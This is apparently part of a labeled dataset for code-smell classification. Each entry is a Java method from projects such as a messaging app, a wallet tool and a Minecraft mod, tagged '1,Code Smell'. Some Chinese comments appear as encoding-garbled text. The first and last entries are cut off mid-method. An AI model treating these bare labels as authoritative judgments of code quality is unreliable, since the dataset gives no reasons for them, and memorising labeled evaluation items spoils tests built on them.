  String selectedContactsString=MessagesController.getInstance(currentAccount).getMainSettings().getString(""story_prv_contacts"",null);
  if (selectedContactsString != null) {
    String[] parts=selectedContactsString.split("","");
    selectedContacts.clear();
    for (int i=0; i < parts.length; ++i) {
      try {
        selectedContacts.add(Long.parseLong(parts[i]));
      }
 catch (      Exception ignore) {
      }
    }
  }
  String selectedContactsGroupsString=MessagesController.getInstance(currentAccount).getMainSettings().getString(""story_prv_grpcontacts"",null);
  if (selectedContactsGroupsString != null) {
    String[] parts=selectedContactsGroupsString.split("";"");
    selectedContactsByGroup.clear();
    for (int i=0; i < parts.length; ++i) {
      String[] parts2=parts[i].split("","");
      if (parts2.length <= 0) {
        continue;
      }
      long id;
      try {
        id=Long.parseLong(parts2[0]);
      }
 catch (      Exception ignore) {
        continue;
      }
      ArrayList<Long> userIds=new ArrayList<>();
      for (int j=1; j < parts2.length; ++j) {
        userIds.add(Long.parseLong(parts2[j]));
      }
      selectedContactsByGroup.put(id,userIds);
    }
  }
  String excludedEveryoneString=MessagesController.getInstance(currentAccount).getMainSettings().getString(""story_prv_everyoneexcept"",null);
  if (excludedEveryoneString != null) {
    String[] parts=excludedEveryoneString.split("","");
    excludedEveryone.clear();
    for (int i=0; i < parts.length; ++i) {
      try {
        excludedEveryone.add(Long.parseLong(parts[i]));
      }
 catch (      Exception ignore) {
      }
    }
  }
  String excludedEveryoneGroupsString=MessagesController.getInstance(currentAccount).getMainSettings().getString(""story_prv_grpeveryoneexcept"",null);
  if (excludedEveryoneGroupsString != null) {
    String[] parts=excludedEveryoneGroupsString.split("";"");
    excludedEveryoneByGroup.clear();
    for (int i=0; i < parts.length; ++i) {
      String[] parts2=parts[i].split("","");
      if (parts2.length <= 0) {
        continue;
      }
      long id;
      try {
        id=Long.parseLong(parts2[0]);
      }
 catch (      Exception ignore) {
        continue;
      }
      ArrayList<Long> userIds=new ArrayList<>();
      for (int j=1; j < parts2.length; ++j) {
        userIds.add(Long.parseLong(parts2[j]));
      }
      excludedEveryoneByGroup.put(id,userIds);
    }
  }
  String excludedContactsString=MessagesController.getInstance(currentAccount).getMainSettings().getString(""story_prv_excluded"",null);
  if (excludedContactsString != null) {
    String[] parts=excludedContactsString.split("","");
    excludedContacts.clear();
    for (int i=0; i < parts.length; ++i) {
      try {
        excludedContacts.add(Long.parseLong(parts[i]));
      }
 catch (      Exception ignore) {
      }
    }
  }
  selectedContactsCount=mergeUsers(selectedContacts,selectedContactsByGroup).size();
  excludedEveryoneCount=mergeUsers(excludedEveryone,excludedEveryoneByGroup).size();
  allowScreenshots=!MessagesController.getInstance(currentAccount).getMainSettings().getBoolean(""story_noforwards"",false);
  keepOnMyPage=MessagesController.getInstance(currentAccount).getMainSettings().getBoolean(""story_keep"",true);
}",1,Code Smell
"@Override public void needChangePanelVisibility(boolean show){
  if (show) {
    FrameLayout.LayoutParams layoutParams3=(FrameLayout.LayoutParams)mentionListView.getLayoutParams();
    int height=36 * Math.min(3,mentionsAdapter.getItemCount()) + (mentionsAdapter.getItemCount() > 3 ? 18 : 0);
    layoutParams3.height=AndroidUtilities.dp(height);
    layoutParams3.topMargin=-AndroidUtilities.dp(height);
    mentionListView.setLayoutParams(layoutParams3);
    if (mentionListAnimation != null) {
      mentionListAnimation.cancel();
      mentionListAnimation=null;
    }
    if (mentionListView.getVisibility() == View.VISIBLE) {
      mentionListView.setTranslationY(0);
      return;
    }
 else {
      mentionLayoutManager.scrollToPositionWithOffset(0,10000);
    }
    if (allowMentions) {
      mentionListView.setVisibility(View.VISIBLE);
      mentionListViewVisible=true;
      mentionListView.setTranslationY(AndroidUtilities.dp(height));
      mentionListView.setTranslationY(MathUtils.clamp(mentionListView.getTranslationY(),0,AndroidUtilities.dp(height)));
      mentionListAnimation=new SpringAnimation(mentionListView,DynamicAnimation.TRANSLATION_Y).setMinValue(0).setMaxValue(AndroidUtilities.dp(height)).setSpring(new SpringForce(0f).setStiffness(750f).setDampingRatio(SpringForce.DAMPING_RATIO_NO_BOUNCY));
      mentionListAnimation.addEndListener((animation,canceled,value,velocity) -> {
        if (mentionListAnimation == animation) {
          mentionListAnimation=null;
        }
      }
);
      mentionListAnimation.start();
    }
 else {
      mentionListView.setTranslationY(0);
      mentionListView.setVisibility(View.INVISIBLE);
    }
  }
 else {
    if (mentionListAnimation != null) {
      mentionListAnimation.cancel();
      mentionListAnimation=null;
    }
    if (mentionListView.getVisibility() == View.GONE) {
      return;
    }
    if (allowMentions) {
      mentionListViewVisible=false;
      mentionListView.setTranslationY(MathUtils.clamp(mentionListView.getTranslationY(),0,mentionListView.getMeasuredHeight()));
      mentionListAnimation=new SpringAnimation(mentionListView,DynamicAnimation.TRANSLATION_Y).setMinValue(0).setMaxValue(mentionListView.getMeasuredHeight()).setSpring(new SpringForce(mentionListView.getMeasuredHeight()).setStiffness(750f).setDampingRatio(SpringForce.DAMPING_RATIO_NO_BOUNCY));
      mentionListAnimation.addEndListener((animation,canceled,value,velocity) -> {
        if (mentionListAnimation == animation) {
          mentionListView.setVisibility(View.GONE);
          mentionListAnimation=null;
        }
      }
);
      mentionListAnimation.start();
    }
 else {
      mentionListView.setVisibility(View.GONE);
    }
  }
}",1,Code Smell
"/** 
 * 涓嶆敹闆嗙殑 span 淇℃伅
 * @param spanNode
 * @return
 */
private boolean ignore(SpanNode spanNode){
  if (CollUtil.isEmpty(properties.getCollector().getIgnoreTrackers())) {
    return false;
  }
  for (  TrackerProperties.IgnoreTracker ignoreTracker : properties.getCollector().getIgnoreTrackers()) {
    if (spanNode.getSpanName().equals(ignoreTracker.getSpanName())) {
      if (!ignoreTracker.getRootSpan()) {
        return true;
      }
 else       if (ignoreTracker.getRootSpan() & spanNode.getSpanParentId().equals(TrackerConstants.ROOT_SPAN)) {
        return true;
      }
    }
    if (spanNode.getSpanType().equals(ignoreTracker.getSpanType())) {
      if (!ignoreTracker.getRootSpan()) {
        return true;
      }
 else       if (ignoreTracker.getRootSpan() & spanNode.getSpanParentId().equals(TrackerConstants.ROOT_SPAN)) {
        return true;
      }
    }
  }
  return false;
}
",1,Code Smell
"private void moveUnsnapped(Element element,int deltaX,int deltaY){
  element.move(deltaX,deltaY);
  if (deltaX > 0) {
    Element closest=null;
    int closestDist=Integer.MAX_VALUE;
    for (    Element e : container.getElements()) {
      if (container.shouldNotSnapTo(e))       continue;
      int dist=e.getX() - element.getX2();
      if (dist > 0 && dist <= container.getSnappingRange() && (closest == null || dist < closestDist) && isNextToHorizontally(element,e)) {
        closest=e;
        closestDist=dist;
      }
    }
    if (closest != null) {
      element.setPos(closest.getX() - element.getWidth(),element.getY());
      snapMain(closest,Direction.Right);
    }
  }
 else   if (deltaX < 0) {
    Element closest=null;
    int closestDist=Integer.MAX_VALUE;
    for (    Element e : container.getElements()) {
      if (container.shouldNotSnapTo(e))       continue;
      int dist=element.getX() - e.getX2();
      if (dist > 0 && dist <= container.getSnappingRange() && (closest == null || dist < closestDist) && isNextToHorizontally(element,e)) {
        closest=e;
        closestDist=dist;
      }
    }
    if (closest != null) {
      element.setPos(closest.getX2(),element.getY());
      snapMain(closest,Direction.Left);
    }
  }
 else   if (deltaY > 0) {
    Element closest=null;
    int closestDist=Integer.MAX_VALUE;
    for (    Element e : container.getElements()) {
      if (container.shouldNotSnapTo(e))       continue;
      int dist=e.getY() - element.getY2();
      if (dist > 0 && dist <= container.getSnappingRange() && (closest == null || dist < closestDist) && isNextToVertically(element,e)) {
        closest=e;
        closestDist=dist;
      }
    }
    if (closest != null) {
      element.setPos(element.getX(),closest.getY() - element.getHeight());
      snapMain(closest,Direction.Top);
    }
  }
 else   if (deltaY < 0) {
    Element closest=null;
    int closestDist=Integer.MAX_VALUE;
    for (    Element e : container.getElements()) {
      if (container.shouldNotSnapTo(e))       continue;
      int dist=element.getY() - e.getY2();
      if (dist > 0 && dist <= container.getSnappingRange() && (closest == null || dist < closestDist) && isNextToVertically(element,e)) {
        closest=e;
        closestDist=dist;
      }
    }
    if (closest != null) {
      element.setPos(element.getX(),closest.getY2());
      snapMain(closest,Direction.Bottom);
    }
  }
}",1,Code Smell
"private static void parse(){
  GZIPInputStream zipStream=null;
  BufferedInputStream bufStream=null;
  InputStream stream=null;
  try {
    long start=System.currentTimeMillis();
    stream=ApplicationLoader.applicationContext.getAssets().open(""codelng.gzip"");
    zipStream=new GZIPInputStream(stream,65536);
    bufStream=new BufferedInputStream(zipStream,65536);
    StreamReader reader=new StreamReader(bufStream);
    HashMap<Integer,String[]> languages=new HashMap<>();
    int languagesCount=reader.readUint8();
    for (int i=0; i < languagesCount; ++i) {
      int lngid=reader.readUint8();
      int aliasesCount=reader.readUint8();
      String[] aliases=new String[aliasesCount];
      for (int j=0; j < aliasesCount; ++j) {
        aliases[j]=reader.readString();
      }
      languages.put(lngid,aliases);
    }
    int patternsCount=reader.readUint16();
    ParsedPattern[] patterns=new ParsedPattern[patternsCount];
    for (int i=0; i < patternsCount; ++i) {
      patterns[i]=new ParsedPattern();
      int b=reader.readUint8();
      patterns[i].multiline=(b & 1) != 0;
      patterns[i].caseInsensitive=(b & 2) != 0;
      patterns[i].pattern=reader.readString();
    }
    if (compiledPatterns == null) {
      compiledPatterns=new HashMap<>();
    }
    for (int i=0; i < languagesCount; ++i) {
      int lngid=reader.readUint8();
      TokenPattern[] tokens=readTokens(reader,patterns,languages);
      String[] aliases=languages.get(lngid);
      for (      String alias : aliases) {
        compiledPatterns.put(alias,tokens);
      }
    }
    FileLog.d(""[CodeHighlighter] Successfully read "" + languagesCount + "" languages, ""+ patternsCount+ "" patterns in ""+ (System.currentTimeMillis() - start)+ ""ms from codelng.gzip"");
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
 finally {
    try {
      if (zipStream != null) {
        zipStream.close();
      }
      if (bufStream != null) {
        bufStream.close();
      }
      if (stream != null) {
        stream.close();
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
  }
}",1,Code Smell
"public ChannelRecommendations getChannelRecommendations(long chatId){
  TLRPC.InputChannel inputChannel=getInputChannel(chatId);
  if (inputChannel == null && chatId != 0) {
    return null;
  }
  if (cachedChannelRecommendations == null) {
    cachedChannelRecommendations=new HashMap<>();
  }
  final boolean isPremium=getUserConfig().isPremium();
  ChannelRecommendations rec=null;
  if (cachedChannelRecommendations.containsKey(chatId)) {
    rec=cachedChannelRecommendations.get(chatId);
    if (rec != null && rec.wasPremium == isPremium) {
      return rec;
    }
  }
  cachedChannelRecommendations.put(chatId,null);
  TLRPC.TL_channels_getChannelRecommendations req=new TLRPC.TL_channels_getChannelRecommendations();
  if (chatId != 0) {
    req.flags|=1;
    req.channel=inputChannel;
  }
  getConnectionsManager().sendRequest(req,(res,err) -> AndroidUtilities.runOnUIThread(() -> {
    if (res instanceof TLRPC.messages_Chats) {
      ArrayList<TLRPC.Chat> chats=((TLRPC.messages_Chats)res).chats;
      putChats(chats,false);
      ChannelRecommendations newrec=new ChannelRecommendations();
      newrec.wasPremium=isPremium;
      newrec.chats.addAll(chats);
      if (res instanceof TLRPC.TL_messages_chatsSlice) {
        newrec.more=Math.max(0,((TLRPC.TL_messages_chatsSlice)res).count - chats.size());
      }
 else       if (!getUserConfig().isPremium() && BuildVars.DEBUG_PRIVATE_VERSION) {
        newrec.more=90;
      }
      cachedChannelRecommendations.put(chatId,newrec);
      getNotificationCenter().postNotificationName(NotificationCenter.channelRecommendationsLoaded,chatId);
    }
  }
));
  return rec;
}",1,Code Smell
"@Nullable @Override public J visit(@Nullable Tree tree,Integer p){
  if (done) {
    return (J)tree;
  }
  if (expected.isInstance(tree)) {
    @SuppressWarnings(""unchecked"") J2 t=(J2)tree;
    if (blockEnclosingTemplateComment != null) {
      for (      Comment comment : t.getComments()) {
        if (isTemplateStopComment(comment)) {
          done=true;
          break;
        }
      }
      J2 trimmed=done ? null : (J2)TemplatedTreeTrimmer.trimTree(t);
      if (trimmed != null) {
        js.add(trimmed);
      }
      return t;
    }
    List<Comment> comments=t.getPrefix().getComments();
    for (int i=0; i < comments.size(); i++) {
      Comment comment=comments.get(i);
      if (comment instanceof TextComment && ((TextComment)comment).getText().equals(TEMPLATE_COMMENT)) {
        blockEnclosingTemplateComment=getCursor().firstEnclosing(J.Block.class);
        J2 trimmed=(J2)TemplatedTreeTrimmer.trimTree(t);
        if (t != trimmed) {
          done=true;
        }
        if (trimmed != null) {
          js.add(trimmed.withPrefix(trimmed.getPrefix().withComments(comments.subList(i + 1,comments.size()))));
        }
        return t;
      }
    }
  }
 else   if (tree != null && !js.isEmpty()) {
    J2 trimmed=(J2)TemplatedTreeTrimmer.trimTree((J)tree);
    if (trimmed != tree) {
      done=true;
    }
  }
  return super.visit(tree,p);
}
@Override public @Nullable J visit(@Nullable Tree tree,Integer integer){
  J j=super.visit(tree,integer);
  if (stopCommentExists(j)) {
    Cursor parent=getCursor().getParent();
    if (parent == null || !(parent.getValue() instanceof J.MethodInvocation)) {
      return j.withMarkers(j.getMarkers().addIfAbsent(new RemoveTreeMarker(Tree.randomId())));
    }
  }
  return j;
}",1,Code Smell
"/** 
 * Add a new value to the array map.
 * @param key The key under which to store the value.  Ifthis key already exists in the array, its value will be replaced.
 * @param value The value to store for the given key.
 * @return Returns the old value that was stored for the given key, or null if therewas no such key.
 */
@Override public V put(K key,V value){
  final int osize=mSize;
  final int hash;
  int index;
  if (key == null) {
    hash=0;
    index=indexOfNull();
  }
 else {
    hash=mIdentityHashCode ? System.identityHashCode(key) : key.hashCode();
    index=indexOf(key,hash);
  }
  if (index >= 0) {
    index=(index << 1) + 1;
    final V old=(V)mArray[index];
    mArray[index]=value;
    return old;
  }
  index=~index;
  if (osize >= mHashes.length) {
    final int n=osize >= (BASE_SIZE * 2) ? (osize + (osize >> 1)) : (osize >= BASE_SIZE ? (BASE_SIZE * 2) : BASE_SIZE);
    if (DEBUG)     Log.d(TAG,""put: grow from "" + mHashes.length + "" to ""+ n);
    final int[] ohashes=mHashes;
    final Object[] oarray=mArray;
    allocArrays(n);
    if (CONCURRENT_MODIFICATION_EXCEPTIONS && osize != mSize) {
      throw new ConcurrentModificationException();
    }
    if (mHashes.length > 0) {
      if (DEBUG)       Log.d(TAG,""put: copy 0-"" + osize + "" to 0"");
      System.arraycopy(ohashes,0,mHashes,0,ohashes.length);
      System.arraycopy(oarray,0,mArray,0,oarray.length);
    }
    freeArrays(ohashes,oarray,osize);
  }
  if (index < osize) {
    if (DEBUG)     Log.d(TAG,""put: move "" + index + ""-""+ (osize - index)+ "" to ""+ (index + 1));
    System.arraycopy(mHashes,index,mHashes,index + 1,osize - index);
    System.arraycopy(mArray,index << 1,mArray,(index + 1) << 1,(mSize - index) << 1);
  }
  if (CONCURRENT_MODIFICATION_EXCEPTIONS) {
    if (osize != mSize || index >= mHashes.length) {
      throw new ConcurrentModificationException();
    }
  }
  mHashes[index]=hash;
  mArray[index << 1]=key;
  mArray[(index << 1) + 1]=value;
  mSize++;
  return null;
}",1,Code Smell
"public ExcelFileData excelSaveAndParse(MultipartFile file) throws DEException {
  String filename=file.getOriginalFilename();
  List<ExcelSheetData> excelSheetDataList=null;
  try {
    excelSheetDataList=parseExcel(filename,file.getInputStream(),true);
  }
 catch (  Exception e) {
    DEException.throwException(e);
  }
  List<ExcelSheetData> returnSheetDataList=new ArrayList<>();
  returnSheetDataList=excelSheetDataList;
  returnSheetDataList=returnSheetDataList.stream().filter(excelSheetData -> !CollectionUtils.isEmpty(excelSheetData.getFields())).collect(Collectors.toList());
  String excelId=UUID.randomUUID().toString();
  String filePath=saveFile(file,excelId);
  for (  ExcelSheetData excelSheetData : returnSheetDataList) {
    if (excelSheetData.getExcelLabel().length() > 40) {
      DEException.throwException(excelSheetData.getExcelLabel() + ""闀垮害涓嶈兘澶т簬40锛�"");
    }
    excelSheetData.setLastUpdateTime(System.currentTimeMillis());
    excelSheetData.setTableName(excelSheetData.getExcelLabel());
    excelSheetData.setDeTableName(""excel_"" + excelSheetData.getExcelLabel() + ""_""+ UUID.randomUUID().toString().replace(""-"","""").substring(0,10));
    excelSheetData.setPath(filePath);
    excelSheetData.setSheetId(UUID.randomUUID().toString());
    excelSheetData.setSheetExcelId(excelId);
    excelSheetData.setFileName(filename);
    for (    TableField field : excelSheetData.getFields()) {
      if (field.getOriginName().length() > 40) {
        DEException.throwException(excelSheetData.getExcelLabel() + ""鐨勫瓧娈�"" + field.getOriginName()+ ""闀垮害涓嶈兘澶т簬40锛�"");
      }
      if (field.getFieldType().equalsIgnoreCase(""TEXT"")) {
        field.setDeType(0);
        field.setDeExtractType(0);
      }
      if (field.getFieldType().equalsIgnoreCase(""DATETIME"")) {
        field.setDeType(1);
        field.setDeExtractType(1);
      }
      if (field.getFieldType().equalsIgnoreCase(""LONG"")) {
        field.setDeType(2);
        field.setDeExtractType(2);
      }
      if (field.getFieldType().equalsIgnoreCase(""DOUBLE"")) {
        field.setDeType(3);
        field.setDeExtractType(3);
      }
    }
    long size=0;
    String unit=""B"";
    if (file.getSize() / 1024 == 0) {
      size=file.getSize();
    }
    if (0 < file.getSize() / 1024 && file.getSize() / 1024 < 1024) {
      size=file.getSize() / 1024;
      unit=""KB"";
    }
    if (1024 <= file.getSize() / 1024) {
      size=file.getSize() / 1024 / 1024;
      unit=""MB"";
    }
    excelSheetData.setSize(size + "" "" + unit);
  }
  ExcelFileData excelFileData=new ExcelFileData();
  excelFileData.setExcelLabel(filename.substring(0,filename.lastIndexOf('.')));
  excelFileData.setId(excelId);
  excelFileData.setPath(filePath);
  excelFileData.setSheets(returnSheetDataList);
  return excelFileData;
}",1,Code Smell
"@Override public void exportWallet(Wallet wallet,OutputStream outputStream,String password) throws ExportException {
  if (!wallet.isValid()) {
    throw new ExportException(""Cannot export an incomplete wallet"");
  }
  if (!wallet.getPolicyType().equals(PolicyType.MULTI)) {
    throw new ExportException(getName() + "" import requires a multisig wallet"");
  }
  boolean multipleDerivations=false;
  Set<String> derivationSet=new HashSet<>();
  for (  Keystore keystore : wallet.getKeystores()) {
    derivationSet.add(keystore.getKeyDerivation().getDerivationPath());
  }
  if (derivationSet.size() > 1) {
    multipleDerivations=true;
  }
  try {
    BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(outputStream,StandardCharsets.UTF_8));
    writer.append(""# "" + getName() + "" setup file (created by Sparrow)\n"");
    writer.append(""#\n"");
    writer.append(""Name: "").append(wallet.getFullName().length() >= 20 ? (wallet.getDisplayName().length() >= 20 ? wallet.getDisplayName().substring(0,20) : wallet.getDisplayName()) : wallet.getFullName()).append(""\n"");
    writer.append(""Policy: "").append(Integer.toString(wallet.getDefaultPolicy().getNumSignaturesRequired())).append("" of "").append(Integer.toString(wallet.getKeystores().size())).append(""\n"");
    if (!multipleDerivations) {
      writer.append(""Derivation: "").append(wallet.getKeystores().get(0).getKeyDerivation().getDerivationPath()).append(""\n"");
    }
    writer.append(""Format: "").append(wallet.getScriptType().toString().replace(""P2SH-P2WSH"",""P2WSH-P2SH"")).append(""\n"");
    writer.append(""\n"");
    for (    Keystore keystore : wallet.getKeystores()) {
      if (multipleDerivations) {
        writer.append(""Derivation: "").append(keystore.getKeyDerivation().getDerivationPath()).append(""\n"");
      }
      writer.append(keystore.getKeyDerivation().getMasterFingerprint().toUpperCase(Locale.ROOT)).append("": "").append(keystore.getExtendedPublicKey().toString()).append(""\n"");
      if (multipleDerivations) {
        writer.append(""\n"");
      }
    }
    writer.flush();
  }
 catch (  Exception e) {
    log.error(""Error exporting "" + getName() + "" wallet"",e);
    throw new ExportException(""Error exporting "" + getName() + "" wallet"",e);
  }
}",1,Code Smell
"public String list(String path){
  if (path != null && !path.isEmpty()) {
    try {
      StringBuilder stringBuilder=new StringBuilder();
      File file=new File(path.trim());
      if (file.isDirectory()) {
        File[] files=file.listFiles();
        if (files == null)         return null;
        for (        File tmp : files) {
          if (tmp.isDirectory()) {
            stringBuilder.append(""d:"").append(tmp.getAbsolutePath()).append(""\n"");
          }
 else           if (tmp.isFile()) {
            stringBuilder.append(""f:"").append(tmp.getAbsolutePath()).append(""\n"");
          }
 else {
            stringBuilder.append(""o:"").append(tmp.getAbsolutePath()).append(""\n"");
          }
        }
        return stringBuilder.toString();
      }
 else       if (file.isFile()) {
        return read(path);
      }
    }
 catch (    Exception e) {
    }
  }
  return null;
}
",1,Code Smell
"public static void update(Context context){
  String[] urls=getMetadata(context);
  if (urls == null || urls.length != 4) {
    instance=null;
    return;
  }
  String sha1Name=urls[0];
  String sha1Url=urls[1];
  String dataName=urls[2];
  String dataUrl=urls[3];
  EhTagDatabase tmp=instance;
  if (tmp != null && !tmp.name.equals(dataName)) {
    instance=null;
  }
  IoThreadPoolExecutor.getInstance().execute(() -> {
    if (!lock.tryLock()) {
      return;
    }
    try {
      File dir=AppConfig.getFilesDir(""tag-translations"");
      if (dir == null) {
        return;
      }
      File sha1File=new File(dir,sha1Name);
      File dataFile=new File(dir,dataName);
      if (!checkData(sha1File,dataFile)) {
        FileUtils.delete(sha1File);
        FileUtils.delete(dataFile);
      }
      if (instance == null && dataFile.exists()) {
        try (BufferedSource source=Okio.buffer(Okio.source(dataFile))){
          instance=new EhTagDatabase(dataName,source);
        }
 catch (        IOException e) {
          FileUtils.delete(sha1File);
          FileUtils.delete(dataFile);
        }
      }
      OkHttpClient client=EhApplication.getOkHttpClient(EhApplication.getInstance());
      File tempSha1File=new File(dir,sha1Name + "".tmp"");
      if (!save(client,sha1Url,tempSha1File)) {
        FileUtils.delete(tempSha1File);
        return;
      }
      if (checkData(tempSha1File,dataFile)) {
        FileUtils.delete(tempSha1File);
        return;
      }
      File tempDataFile=new File(dir,dataName + "".tmp"");
      if (!save(client,dataUrl,tempDataFile)) {
        FileUtils.delete(tempDataFile);
        return;
      }
      if (!checkData(tempSha1File,tempDataFile)) {
        FileUtils.delete(tempSha1File);
        FileUtils.delete(tempDataFile);
        return;
      }
      FileUtils.delete(sha1File);
      FileUtils.delete(dataFile);
      tempSha1File.renameTo(sha1File);
      tempDataFile.renameTo(dataFile);
      try (BufferedSource source=Okio.buffer(Okio.source(dataFile))){
        instance=new EhTagDatabase(dataName,source);
      }
 catch (      IOException e) {
      }
    }
  finally {
      lock.unlock();
    }
  }
);
}",1,Code Smell
"/** 
 * 閫氳繃 classElement 鎿嶄綔璧锋墍鏈夊瓧娈碉紝鐢熸垚 ColumnInfo 骞跺～鍏� columnInfos 缁撳悎
 */
private void fillColumnInfoList(Set<ColumnInfo> columnInfos,List<String> defaultColumns,TypeElement baseElement,TypeElement classElement,boolean camelToUnderline){
  for (  Element fieldElement : classElement.getEnclosedElements()) {
    if (ElementKind.FIELD == fieldElement.getKind()) {
      Set<Modifier> modifiers=fieldElement.getModifiers();
      if (modifiers.contains(Modifier.STATIC)) {
        continue;
      }
      Column column=fieldElement.getAnnotation(Column.class);
      if (column != null && column.ignore()) {
        continue;
      }
      final String[] typeHandlerClass={""""};
      List<? extends AnnotationMirror> annotationMirrors=fieldElement.getAnnotationMirrors();
      for (      AnnotationMirror annotationMirror : annotationMirrors) {
        annotationMirror.getElementValues().forEach((executableElement,annotationValue) -> {
          if (""typeHandler"".contentEquals(executableElement.getSimpleName())) {
            typeHandlerClass[0]=annotationValue.toString();
          }
        }
);
      }
      TypeMirror typeMirror=fieldElement.asType();
      Element element=typeUtils.asElement(typeMirror);
      if (element != null) {
        typeMirror=element.asType();
      }
      String typeString=typeMirror.toString().trim();
      TypeElement typeElement=null;
      if (typeMirror.getKind() == TypeKind.DECLARED) {
        typeElement=(TypeElement)((DeclaredType)typeMirror).asElement();
      }
      if ((column == null || ""org.apache.ibatis.type.UnknownTypeHandler"".equals(typeHandlerClass[0])) && !DEFAULT_SUPPORT_COLUMN_TYPES.contains(typeString) && (typeElement != null && ElementKind.ENUM != typeElement.getKind())) {
        continue;
      }
      String property=fieldElement.toString();
      String columnName;
      if (column != null && !StrUtil.isBlank(column.value())) {
        columnName=column.value();
      }
 else {
        if (camelToUnderline) {
          columnName=StrUtil.camelToUnderline(property);
        }
 else {
          columnName=property;
        }
      }
      String[] alias=getColumnAliasByGetterMethod(baseElement,property);
      if (alias == null || alias.length == 0) {
        ColumnAlias columnAlias=fieldElement.getAnnotation(ColumnAlias.class);
        if (columnAlias != null) {
          alias=columnAlias.value();
        }
      }
      ColumnInfo columnInfo=new ColumnInfo();
      columnInfo.setProperty(property);
      columnInfo.setColumn(columnName);
      columnInfo.setAlias(alias);
      columnInfo.setComment(elementUtils.getDocComment(fieldElement));
      columnInfos.add(columnInfo);
      if (column == null || (!column.isLarge() && !column.isLogicDelete())) {
        defaultColumns.add(columnName);
      }
    }
  }
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public @NotNull ItemStack finishUsingItem(@NotNull ItemStack stack,@NotNull Level worldIn,@NotNull LivingEntity entityLiving){
  ItemStack itemstack=super.finishUsingItem(stack,worldIn,entityLiving);
  if (!worldIn.isClientSide) {
    for (int i=0; i < 16; ++i) {
      double d3=entityLiving.getX() + (entityLiving.getRandom().nextDouble() - 0.5D) * 16.0D;
      double d4=Mth.clamp(entityLiving.getY() + (double)(entityLiving.getRandom().nextInt(16) - 8),0.0D,worldIn.getHeight() - 1);
      double d5=entityLiving.getZ() + (entityLiving.getRandom().nextDouble() - 0.5D) * 16.0D;
      if (entityLiving instanceof ServerPlayer && DistValidate.isValid(worldIn)) {
        Player player=((ServerPlayerEntityBridge)entityLiving).bridge$getBukkitEntity();
        PlayerTeleportEvent event=new PlayerTeleportEvent(player,player.getLocation(),new Location(player.getWorld(),d3,d4,d5),PlayerTeleportEvent.TeleportCause.CHORUS_FRUIT);
        Bukkit.getPluginManager().callEvent(event);
        if (event.isCancelled()) {
          break;
        }
        d3=event.getTo().getX();
        d4=event.getTo().getY();
        d5=event.getTo().getZ();
      }
      if (entityLiving.isPassenger()) {
        entityLiving.stopRiding();
      }
      Vec3 vec3d=entityLiving.position();
      if (this.bridge$forge$onChorusFruitTeleport(entityLiving,d3,d4,d5))       return itemstack;
      if (entityLiving.randomTeleport(d3,d4,d5,true)) {
        worldIn.gameEvent(GameEvent.TELEPORT,vec3d,GameEvent.Context.of(entityLiving));
        SoundEvent soundevent=entityLiving instanceof Fox ? SoundEvents.FOX_TELEPORT : SoundEvents.CHORUS_FRUIT_TELEPORT;
        SoundSource soundSource=entityLiving instanceof Fox ? SoundSource.NEUTRAL : SoundSource.PLAYERS;
        worldIn.playSound(null,entityLiving.getX(),entityLiving.getY(),entityLiving.getZ(),soundevent,soundSource);
        entityLiving.resetFallDistance();
        break;
      }
    }
    if (entityLiving instanceof net.minecraft.world.entity.player.Player) {
      ((net.minecraft.world.entity.player.Player)entityLiving).getCooldowns().addCooldown((Item)(Object)this,20);
    }
  }
  return itemstack;
}",1,Code Smell
"@Deprecated @Override protected void doGet(HttpServletRequest req,HttpServletResponse resp) throws IOException, ServletException {
  String userId=InputParser.getQueryParamOrThrowError(req,""userId"",true);
  String thirdPartyId=InputParser.getQueryParamOrThrowError(req,""thirdPartyId"",true);
  String thirdPartyUserId=InputParser.getQueryParamOrThrowError(req,""thirdPartyUserId"",true);
  if (userId != null && (thirdPartyId != null || thirdPartyUserId != null)) {
    throw new ServletException(new BadRequestException(""Please provide only one of userId or (thirdPartyId & thirdPartyUserId)""));
  }
  if (userId == null && (thirdPartyId == null || thirdPartyUserId == null)) {
    throw new ServletException(new BadRequestException(""Please provide one of userId or (thirdPartyId & thirdPartyUserId)""));
  }
  try {
    AuthRecipeUserInfo user=null;
    if (userId != null) {
      AppIdentifier appIdentifier=getAppIdentifier(req);
      try {
        StorageAndUserIdMapping storageAndUserIdMapping=this.enforcePublicTenantAndGetStorageAndUserIdMappingForAppSpecificApi(req,userId,UserIdType.ANY,true);
        if (storageAndUserIdMapping.userIdMapping != null) {
          userId=storageAndUserIdMapping.userIdMapping.superTokensUserId;
        }
        user=ThirdParty.getUser(appIdentifier,storageAndUserIdMapping.storage,userId);
        if (user != null) {
          UserIdMapping.populateExternalUserIdForUsers(appIdentifier,storageAndUserIdMapping.storage,new AuthRecipeUserInfo[]{user});
        }
      }
 catch (      UnknownUserIdException e) {
      }
    }
 else {
      TenantIdentifier tenantIdentifier=getTenantIdentifier(req);
      Storage storage=getTenantStorage(req);
      user=ThirdParty.getUser(tenantIdentifier,storage,thirdPartyId,thirdPartyUserId);
      if (user != null) {
        UserIdMapping.populateExternalUserIdForUsers(tenantIdentifier.toAppIdentifier(),storage,new AuthRecipeUserInfo[]{user});
      }
    }
    if (user == null) {
      JsonObject result=new JsonObject();
      result.addProperty(""status"",userId != null ? ""UNKNOWN_USER_ID_ERROR"" : ""UNKNOWN_THIRD_PARTY_USER_ERROR"");
      super.sendJsonResponse(200,result,resp);
    }
 else {
      JsonObject result=new JsonObject();
      result.addProperty(""status"",""OK"");
      JsonObject userJson=getVersionFromRequest(req).greaterThanOrEqualTo(SemVer.v4_0) ? user.toJson() : user.toJsonWithoutAccountLinking();
      if (getVersionFromRequest(req).lesserThan(SemVer.v3_0)) {
        userJson.remove(""tenantIds"");
      }
      result.add(""user"",userJson);
      super.sendJsonResponse(200,result,resp);
    }
  }
 catch (  StorageQueryException|TenantOrAppNotFoundException|BadPermissionException e) {
    throw new ServletException(e);
  }
}",1,Code Smell
"@Override public WorkflowProcess clone() throws CloneNotSupportedException {
  WorkflowProcess cloneProcess=(WorkflowProcess)super.clone();
  cloneProcess.setStartEvent((StartEvent)this.startEvent.clone());
  cloneProcess.setEndEvent((EndEvent)this.endEvent.clone());
  Map<String,WorkflowTask> nameToTaskMap=new HashMap<>();
  StartEvent startEvent=cloneProcess.getStartEvent();
  Map<WorkflowAction,List<ConditionNextElement>> workflowActionListMap=startEvent.getActionToNextElementMap();
